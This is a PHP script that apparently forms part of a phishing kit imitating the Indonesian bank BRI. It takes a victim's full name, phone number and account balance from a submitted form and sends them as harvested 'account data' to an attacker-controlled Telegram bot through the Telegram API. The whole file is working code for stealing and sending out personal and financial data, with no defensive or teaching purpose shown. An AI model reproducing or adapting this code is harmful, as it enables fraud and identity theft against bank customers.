<?php
session_start();
include "telegram.php";

$nama = $_POST['nama'];
$saldo = $_POST['saldo'];
$nomor = $_POST['nomor'];
$_SESSION['nomor'] = $nomor;
$_SESSION['saldo'] = $saldo;
$_SESSION['nama'] = $nama;

$message = "
( BRI | DATA |  ".$nomor." )
-- DATA AKUN DISINI --

×> Nama Lengkap : ".$nama."
×> Nomor HP : ".$nomor."
×> Saldo Sisa : ".$saldo."

";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
//header('Location:./../login.php');
?>
